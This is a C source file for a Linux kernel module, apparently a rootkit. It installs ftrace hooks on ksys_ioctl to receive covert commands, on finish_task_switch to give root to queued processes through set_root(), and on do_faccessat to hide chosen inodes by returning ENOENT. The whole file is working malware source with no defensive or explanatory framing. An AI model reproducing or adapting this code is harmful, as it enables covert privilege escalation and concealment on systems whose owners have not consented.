#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/namei.h>
#include "ftrace_helper.h"
#include "hooks.h"
#include "service.h"
#include "privileges.h"
#include "hide.h"

static int (*orig_ksys_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
static struct rq *(*orig_finish_task_switch)(struct task_struct *prev);
long (*orig_do_faccessat)(int dfd, const char __user *filename, int mode);

int hook_ksys_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
{
    int rval = handle_ioctl_request(fd, cmd, arg);

    // 0 means this is not a service request
    if (rval == 0)
        return orig_ksys_ioctl(fd, cmd, arg);
    else
        return rval;
}

static struct rq *hook_finish_task_switch(struct task_struct *prev)
{
    struct pid_list *entry, *to_delete = NULL;
    list_for_each_entry(entry, &pids_waiting_for_root, list) {
        if (entry->pid == current->pid) {
            set_root();
            to_delete = entry;
        }
    }
    if (to_delete != NULL) {
        list_del(&to_delete->list);
        kfree(to_delete);
    }
    return orig_finish_task_switch(prev);
}

long hook_do_faccessat(int dfd, const char __user *filename, int mode)
{
    struct path path;
    int res;
    unsigned long ino;

    // mimic lookup logic of original function
    unsigned int lookup_flags = LOOKUP_FOLLOW;
    
    // perform file lookup
    res = user_path_at(dfd, filename, lookup_flags, &path);
    if (res)
        goto call_orig;
    
    ino = path.dentry->d_inode->i_ino;

    // check if inode should be hidden
    if (should_hide_inode(ino))
        return -ENOENT;

call_orig:
    return orig_do_faccessat(dfd, filename, mode);
}

static struct ftrace_hook hooks[] = {
    HOOK("ksys_ioctl", hook_ksys_ioctl, &orig_ksys_ioctl),
    HOOK("finish_task_switch", hook_finish_task_switch, &orig_finish_task_switch),
    HOOK("do_faccessat", hook_do_faccessat, &orig_do_faccessat)
};

inline int register_hooks(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

inline void unregister_hooks(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}